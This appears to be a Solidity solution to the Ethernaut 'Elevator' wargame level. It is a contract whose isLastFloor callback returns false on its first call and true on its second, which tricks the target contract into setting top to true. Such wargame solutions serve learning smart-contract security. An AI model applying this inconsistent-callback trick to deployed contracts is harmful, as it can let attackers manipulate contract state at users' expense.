// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "contracts/Elevator.sol";




contract BuildingEthernaut is Building {


    Elevator public elevator;

    bool public called;

    constructor(address _elevator){
       elevator = Elevator(_elevator);
       called = false;
    }




    function isLastFloor(uint) public returns (bool result){

        if(!called){
            //first call must return false
            called = true;
            result = false;
        }else{

            //second call must return true
            called = false;
            result = true;
        }


    }

    function goTo() public {

        elevator.goTo(1);


    }
//     Building building = Building(msg.sender);

//     if (! building.isLastFloor(_floor)) {
//       floor = _floor;
//       top = building.isLastFloor(floor);
//     }
//   }

    


}